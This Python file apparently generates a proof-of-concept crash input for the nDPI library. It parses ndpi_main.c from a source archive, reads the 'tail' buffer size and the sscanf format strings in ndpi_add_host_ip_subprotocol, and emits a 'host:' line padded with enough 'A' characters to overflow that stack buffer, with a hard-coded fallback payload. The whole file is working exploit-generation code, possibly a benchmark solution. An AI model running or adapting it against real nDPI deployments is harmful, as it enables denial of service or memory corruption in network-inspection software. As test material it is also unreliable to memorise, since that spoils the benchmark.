import os
import re
import tarfile
import ast
from typing import List, Tuple, Dict, Optional, Any


def _read_file_from_tar(tar_path: str, target_suffix: str) -> Optional[bytes]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name.replace("\\", "/")
                if name.endswith(target_suffix):
                    candidates.append(m)
            if not candidates:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name.replace("\\", "/")
                    if name.endswith("/" + target_suffix) or name.endswith(target_suffix):
                        candidates.append(m)
            if not candidates:
                return None
            candidates.sort(key=lambda x: len(x.name))
            f = tf.extractfile(candidates[0])
            if f is None:
                return None
            return f.read()
    except Exception:
        return None


def _find_in_dir(root: str, filename: str) -> Optional[bytes]:
    for dirpath, _, filenames in os.walk(root):
        if filename in filenames:
            p = os.path.join(dirpath, filename)
            try:
                with open(p, "rb") as f:
                    return f.read()
            except Exception:
                return None
    return None


def _extract_simple_macros(c_text: str) -> Dict[str, int]:
    macros: Dict[str, int] = {}
    for m in re.finditer(r'^[ \t]*#[ \t]*define[ \t]+([A-Za-z_][A-Za-z0-9_]*)[ \t]+([0-9]+)\b', c_text, re.M):
        try:
            macros[m.group(1)] = int(m.group(2))
        except Exception:
            pass
    return macros


class _SafeEval(ast.NodeVisitor):
    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit(self, node):
        if isinstance(node, ast.Expression):
            return self.visit(node.body)
        if isinstance(node, ast.BinOp):
            left = self.visit(node.left)
            right = self.visit(node.right)
            if isinstance(node.op, ast.Add):
                return left + right
            if isinstance(node.op, ast.Sub):
                return left - right
            if isinstance(node.op, ast.Mult):
                return left * right
            if isinstance(node.op, ast.FloorDiv):
                return left // right
            if isinstance(node.op, ast.Div):
                return left // right
            if isinstance(node.op, ast.Mod):
                return left % right
            if isinstance(node.op, ast.LShift):
                return left << right
            if isinstance(node.op, ast.RShift):
                return left >> right
            if isinstance(node.op, ast.BitOr):
                return left | right
            if isinstance(node.op, ast.BitAnd):
                return left & right
            if isinstance(node.op, ast.BitXor):
                return left ^ right
            raise ValueError("bad op")
        if isinstance(node, ast.UnaryOp):
            v = self.visit(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            if isinstance(node.op, ast.Invert):
                return ~v
            raise ValueError("bad unary")
        if isinstance(node, ast.Constant):
            if isinstance(node.value, int):
                return node.value
            raise ValueError("bad const")
        if isinstance(node, ast.Num):
            return int(node.n)
        if isinstance(node, ast.Name):
            if node.id in self.names:
                return int(self.names[node.id])
            raise ValueError("unknown name")
        if isinstance(node, ast.ParenExpr):  # type: ignore[attr-defined]
            return self.visit(node.expression)  # type: ignore[attr-defined]
        raise ValueError("bad node")


def _eval_c_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = re.sub(r'/\*.*?\*/', '', expr, flags=re.S)
    expr = re.sub(r'//.*', '', expr)
    expr = expr.strip()
    if not expr:
        return None
    expr = expr.replace("ULL", "").replace("LL", "").replace("UL", "").replace("L", "").replace("U", "")
    expr = re.sub(r'\bsizeof\s*\([^)]*\)', '1', expr)
    try:
        tree = ast.parse(expr, mode="eval")
        return int(_SafeEval(macros).visit(tree))
    except Exception:
        return None


def _parse_c_string_literal_at(s: str, i: int) -> Tuple[Optional[str], int]:
    if i >= len(s) or s[i] != '"':
        return None, i
    i += 1
    out_chars: List[str] = []
    while i < len(s):
        c = s[i]
        if c == '"':
            i += 1
            return "".join(out_chars), i
        if c == '\\':
            i += 1
            if i >= len(s):
                break
            esc = s[i]
            i += 1
            if esc == 'n':
                out_chars.append('\n')
            elif esc == 'r':
                out_chars.append('\r')
            elif esc == 't':
                out_chars.append('\t')
            elif esc == 'v':
                out_chars.append('\v')
            elif esc == 'b':
                out_chars.append('\b')
            elif esc == 'f':
                out_chars.append('\f')
            elif esc == 'a':
                out_chars.append('\a')
            elif esc == '\\':
                out_chars.append('\\')
            elif esc == '"':
                out_chars.append('"')
            elif esc == "'":
                out_chars.append("'")
            elif esc == '0':
                out_chars.append('\0')
            elif esc in 'xX':
                hex_digits = []
                while i < len(s) and len(hex_digits) < 2 and s[i] in "0123456789abcdefABCDEF":
                    hex_digits.append(s[i])
                    i += 1
                if hex_digits:
                    out_chars.append(chr(int("".join(hex_digits), 16)))
                else:
                    out_chars.append('x')
            elif esc.isdigit():
                oct_digits = [esc]
                while i < len(s) and len(oct_digits) < 3 and s[i].isdigit():
                    oct_digits.append(s[i])
                    i += 1
                try:
                    out_chars.append(chr(int("".join(oct_digits), 8)))
                except Exception:
                    out_chars.append(oct_digits[0])
            else:
                out_chars.append(esc)
        else:
            out_chars.append(c)
            i += 1
    return None, i


def _parse_concatenated_c_string_literals(s: str, i: int) -> Tuple[Optional[str], int]:
    parts: List[str] = []
    j = i
    while True:
        while j < len(s) and s[j].isspace():
            j += 1
        lit, j2 = _parse_c_string_literal_at(s, j)
        if lit is None:
            break
        parts.append(lit)
        j = j2
    if not parts:
        return None, i
    return "".join(parts), j


def _find_matching_paren(s: str, i: int) -> int:
    depth = 0
    in_str = False
    in_chr = False
    esc = False
    while i < len(s):
        c = s[i]
        if in_str:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == '"':
                in_str = False
        elif in_chr:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == "'":
                in_chr = False
        else:
            if c == '"':
                in_str = True
            elif c == "'":
                in_chr = True
            elif c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
                if depth == 0:
                    return i
        i += 1
    return -1


def _find_matching_brace(s: str, i: int) -> int:
    depth = 0
    in_str = False
    in_chr = False
    in_line_comment = False
    in_block_comment = False
    esc = False
    while i < len(s):
        c = s[i]
        c2 = s[i:i+2]
        if in_line_comment:
            if c == '\n':
                in_line_comment = False
        elif in_block_comment:
            if c2 == "*/":
                in_block_comment = False
                i += 1
        elif in_str:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == '"':
                in_str = False
        elif in_chr:
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == "'":
                in_chr = False
        else:
            if c2 == "//":
                in_line_comment = True
                i += 1
            elif c2 == "/*":
                in_block_comment = True
                i += 1
            elif c == '"':
                in_str = True
            elif c == "'":
                in_chr = True
            elif c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    return i
        i += 1
    return -1


def _split_c_args(arg_str: str) -> List[str]:
    args: List[str] = []
    cur: List[str] = []
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    in_str = False
    in_chr = False
    esc = False
    i = 0
    while i < len(arg_str):
        c = arg_str[i]
        if in_str:
            cur.append(c)
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == '"':
                in_str = False
        elif in_chr:
            cur.append(c)
            if esc:
                esc = False
            elif c == '\\':
                esc = True
            elif c == "'":
                in_chr = False
        else:
            if c == '"':
                in_str = True
                cur.append(c)
            elif c == "'":
                in_chr = True
                cur.append(c)
            elif c == '(':
                depth_par += 1
                cur.append(c)
            elif c == ')':
                depth_par -= 1
                cur.append(c)
            elif c == '{':
                depth_br += 1
                cur.append(c)
            elif c == '}':
                depth_br -= 1
                cur.append(c)
            elif c == '[':
                depth_sq += 1
                cur.append(c)
            elif c == ']':
                depth_sq -= 1
                cur.append(c)
            elif c == ',' and depth_par == 0 and depth_br == 0 and depth_sq == 0:
                a = "".join(cur).strip()
                if a:
                    args.append(a)
                cur = []
            else:
                cur.append(c)
        i += 1
    a = "".join(cur).strip()
    if a:
        args.append(a)
    return args


def _extract_function_def(c_text: str, func_name: str) -> Optional[Tuple[int, int, str, str]]:
    for m in re.finditer(r'\b' + re.escape(func_name) + r'\b\s*\(', c_text):
        name_pos = m.start()
        paren_open = c_text.find('(', m.end() - 1)
        if paren_open < 0:
            continue
        paren_close = _find_matching_paren(c_text, paren_open)
        if paren_close < 0:
            continue
        j = paren_close + 1
        while j < len(c_text) and c_text[j].isspace():
            j += 1
        if j < len(c_text) and c_text[j] == '{':
            brace_open = j
            brace_close = _find_matching_brace(c_text, brace_open)
            if brace_close < 0:
                continue
            sig_start = c_text.rfind('\n', 0, name_pos)
            if sig_start < 0:
                sig_start = 0
            else:
                sig_start += 1
            signature = c_text[sig_start:brace_open].strip()
            body = c_text[brace_open:brace_close + 1]
            return sig_start, brace_close + 1, signature, body
    return None


def _parse_param_names(signature: str, func_name: str) -> List[str]:
    idx = signature.find(func_name)
    if idx < 0:
        return []
    paren_open = signature.find('(', idx)
    if paren_open < 0:
        return []
    paren_close = _find_matching_paren(signature, paren_open)
    if paren_close < 0:
        return []
    params_str = signature[paren_open + 1:paren_close].strip()
    if not params_str or params_str == "void":
        return []
    params = _split_c_args(params_str)
    names: List[str] = []
    for p in params:
        p2 = re.sub(r'/\*.*?\*/', '', p, flags=re.S).strip()
        m = re.search(r'([A-Za-z_][A-Za-z0-9_]*)\s*(?:\[[^\]]*\])?\s*$', p2)
        if m:
            names.append(m.group(1))
        else:
            names.append("")
    return names


def _extract_tail_size(func_body: str, macros: Dict[str, int]) -> Optional[int]:
    m = re.search(r'\bchar\s+tail\s*\[\s*([^\]]+)\s*\]', func_body)
    if not m:
        m = re.search(r'\bchar\s+tail\s*\[\s*([^\]]+)\s*\]\s*;', func_body)
    if not m:
        return None
    expr = m.group(1).strip()
    val = _eval_c_int_expr(expr, macros)
    if val is None:
        if re.fullmatch(r'[0-9]+', expr):
            try:
                return int(expr)
            except Exception:
                return None
        if expr in macros:
            return int(macros[expr])
        return None
    return val


def _find_sscanf_calls(text: str, start_offset: int = 0) -> List[Dict[str, Any]]:
    calls: List[Dict[str, Any]] = []
    for m in re.finditer(r'\b(?:__isoc99_)?sscanf\s*\(', text):
        call_start = m.start()
        paren_open = text.find('(', m.end() - 1)
        if paren_open < 0:
            continue
        paren_close = _find_matching_paren(text, paren_open)
        if paren_close < 0:
            continue
        inside = text[paren_open + 1:paren_close]
        args = _split_c_args(inside)
        if len(args) < 2:
            continue
        fmt_str, _ = _parse_concatenated_c_string_literals(args[1], 0)
        if fmt_str is None:
            continue
        calls.append({
            "pos": start_offset + call_start,
            "src": args[0].strip(),
            "fmt": fmt_str,
            "dests": [a.strip() for a in args[2:]],
            "raw": text[call_start:paren_close + 1]
        })
    return calls


def _choose_safe_char_not_in(forbidden: set) -> str:
    for c in "aAbB0ZzXxQqWw":
        if c not in forbidden and c not in {'\n', '\r', '\t', '\v', '\f'}:
            return c
    return "A"


def _parse_scanf_spec(fmt: str, i: int) -> Tuple[Dict[str, Any], int]:
    spec: Dict[str, Any] = {
        "suppressed": False,
        "width": None,
        "length": "",
        "conv": "",
        "set": "",
        "neg": False,
    }
    assert fmt[i] == '%'
    i += 1
    if i < len(fmt) and fmt[i] == '%':
        spec["conv"] = '%'
        return spec, i + 1
    if i < len(fmt) and fmt[i] == '*':
        spec["suppressed"] = True
        i += 1
    w = 0
    has_w = False
    while i < len(fmt) and fmt[i].isdigit():
        has_w = True
        w = w * 10 + (ord(fmt[i]) - 48)
        i += 1
    if has_w:
        spec["width"] = w
    for lm in ("hh", "ll"):
        if fmt.startswith(lm, i):
            spec["length"] = lm
            i += len(lm)
            break
    if spec["length"] == "":
        if i < len(fmt) and fmt[i] in "hlLjztqI":
            spec["length"] = fmt[i]
            i += 1
            if spec["length"] == 'I' and i < len(fmt) and fmt[i] in "3264":
                spec["length"] += fmt[i]
                i += 1
    if i >= len(fmt):
        spec["conv"] = ""
        return spec, i
    if fmt[i] == '[':
        i += 1
        neg = False
        if i < len(fmt) and fmt[i] == '^':
            neg = True
            i += 1
        set_chars: List[str] = []
        if i < len(fmt) and fmt[i] == ']':
            set_chars.append(']')
            i += 1
        while i < len(fmt) and fmt[i] != ']':
            set_chars.append(fmt[i])
            i += 1
        if i < len(fmt) and fmt[i] == ']':
            i += 1
        spec["conv"] = '['
        spec["set"] = "".join(set_chars)
        spec["neg"] = neg
        return spec, i
    spec["conv"] = fmt[i]
    return spec, i + 1


def _scan_specs(fmt: str) -> List[Dict[str, Any]]:
    specs: List[Dict[str, Any]] = []
    i = 0
    while i < len(fmt):
        if fmt[i] == '%':
            spec, i2 = _parse_scanf_spec(fmt, i)
            specs.append(spec)
            i = i2
        else:
            i += 1
    return specs


def _map_assignments(fmt: str, dests: List[str]) -> Dict[int, str]:
    mapping: Dict[int, str] = {}
    assign_idx = 0
    i = 0
    while i < len(fmt):
        if fmt[i] != '%':
            i += 1
            continue
        spec, i2 = _parse_scanf_spec(fmt, i)
        i = i2
        if spec.get("conv") == '%':
            continue
        if not spec.get("suppressed", False):
            if assign_idx < len(dests):
                mapping[assign_idx] = dests[assign_idx]
            assign_idx += 1
    return mapping


def _find_assign_index_for_dest(fmt: str, dests: List[str], dest_ident: str) -> Optional[int]:
    assign_idx = 0
    i = 0
    while i < len(fmt):
        if fmt[i] != '%':
            i += 1
            continue
        spec, i2 = _parse_scanf_spec(fmt, i)
        i = i2
        if spec.get("conv") == '%':
            continue
        if not spec.get("suppressed", False):
            if assign_idx < len(dests):
                d = dests[assign_idx]
                if re.search(r'\b' + re.escape(dest_ident) + r'\b', d):
                    return assign_idx
            assign_idx += 1
    return None


def _default_token_for_spec(spec: Dict[str, Any]) -> str:
    conv = spec.get("conv", "")
    if conv in ("d", "i", "u", "o", "x", "X"):
        return "0"
    if conv in ("f", "F", "e", "E", "g", "G", "a", "A"):
        return "0"
    if conv == "p":
        return "0"
    if conv == "s":
        return "a"
    if conv == "c":
        w = spec.get("width")
        if isinstance(w, int) and w > 0:
            return "A" * w
        return "A"
    if conv == '[':
        w = spec.get("width")
        if not isinstance(w, int) or w <= 0:
            w = 1
        set_str = spec.get("set", "")
        if spec.get("neg", False):
            forbidden = set(set_str)
            ch = _choose_safe_char_not_in(forbidden)
        else:
            ch = set_str[0] if set_str else "A"
            if ch in {'\n', '\r'}:
                ch = "A"
        return ch * w
    if conv == "n":
        return ""
    return "a"


def _synthesize_input_from_fmt(fmt: str, tokens_by_assign_idx: Dict[int, str]) -> str:
    out: List[str] = []
    assign_idx = 0
    i = 0
    while i < len(fmt):
        c = fmt[i]
        if c == '%':
            spec, i2 = _parse_scanf_spec(fmt, i)
            i = i2
            if spec.get("conv") == '%':
                out.append('%')
                continue
            token = ""
            if spec.get("conv") == "n":
                token = ""
            else:
                token = _default_token_for_spec(spec)
            if not spec.get("suppressed", False):
                if assign_idx in tokens_by_assign_idx:
                    token = tokens_by_assign_idx[assign_idx]
                assign_idx += 1
            out.append(token)
            continue
        if c.isspace():
            while i < len(fmt) and fmt[i].isspace():
                i += 1
            out.append(' ')
            continue
        out.append(c)
        i += 1
    s = "".join(out)
    s = re.sub(r' +', ' ', s)
    return s


def _find_host_prefix(c_text: str, func_name: str, def_start: int, def_end: int) -> str:
    candidates: List[str] = []
    for lit in re.findall(r'"([^"\n]*host:[^"\n]*)"', c_text):
        if "host:" in lit and len(lit) <= 16:
            candidates.append(lit)
    for lit in re.findall(r'"([^"\n]*ip:[^"\n]*)"', c_text):
        if "ip:" in lit and len(lit) <= 16:
            candidates.append(lit)
    for m in re.finditer(r'\b' + re.escape(func_name) + r'\b\s*\(', c_text):
        if def_start <= m.start() < def_end:
            continue
        window = c_text[max(0, m.start() - 400):m.start()]
        for lit in re.findall(r'"([^"\n]{1,16})"', window):
            if lit in ("host:", "ip:", "host", "ip", "HOST:", "IP:"):
                candidates.append(lit)
    pref = None
    for c in candidates:
        if "host:" in c:
            pref = "host:"
            break
    if pref is None:
        for c in candidates:
            if c.lower().startswith("host"):
                pref = c
                break
    if pref is None:
        pref = "host:"
    if pref == "host":
        return "host:"
    return pref


class Solution:
    def solve(self, src_path: str) -> bytes:
        func_name = "ndpi_add_host_ip_subprotocol"
        if os.path.isdir(src_path):
            data = _find_in_dir(src_path, "ndpi_main.c")
        else:
            data = _read_file_from_tar(src_path, "src/lib/ndpi_main.c")
            if data is None:
                data = _read_file_from_tar(src_path, "ndpi_main.c")
        if data is None:
            return b"host:a." + (b"A" * 48) + b"\n"

        c_text = data.decode("utf-8", errors="ignore")
        macros = _extract_simple_macros(c_text)

        fdef = _extract_function_def(c_text, func_name)
        if not fdef:
            return b"host:a." + (b"A" * 48) + b"\n"
        def_start, def_end, signature, body = fdef

        tail_size = _extract_tail_size(body, macros)
        if tail_size is None or tail_size <= 0 or tail_size > 4096:
            tail_size = 48

        inner_calls = _find_sscanf_calls(body, start_offset=def_start)
        best_value = None
        best_len = None

        for call in inner_calls:
            dests = call["dests"]
            if not any(re.search(r'\btail\b', d) for d in dests):
                continue
            fmt = call["fmt"]
            tail_assign_idx = _find_assign_index_for_dest(fmt, dests, "tail")
            if tail_assign_idx is None:
                continue
            specs = _scan_specs(fmt)
            assign_specs: List[Dict[str, Any]] = []
            for spec in specs:
                if spec.get("conv") == '%':
                    continue
                if not spec.get("suppressed", False):
                    assign_specs.append(spec)
            if tail_assign_idx >= len(assign_specs):
                continue
            tail_spec = assign_specs[tail_assign_idx]
            width = tail_spec.get("width")
            if isinstance(width, int) and width <= max(0, tail_size - 1):
                continue

            tokens = {tail_assign_idx: "A" * tail_size}
            v = _synthesize_input_from_fmt(fmt, tokens)
            if not v:
                continue
            l = len(v.encode("ascii", errors="ignore"))
            if best_len is None or l < best_len:
                best_len = l
                best_value = v

        if best_value is None:
            best_value = "a." + ("A" * tail_size)

        prefix = _find_host_prefix(c_text, func_name, def_start, def_end)
        line = (prefix + best_value + "\n").encode("ascii", errors="ignore")

        if len(line) > 2048:
            line = (prefix + ("a." + ("A" * min(200, tail_size if tail_size > 0 else 200))) + "\n").encode("ascii", errors="ignore")
        return line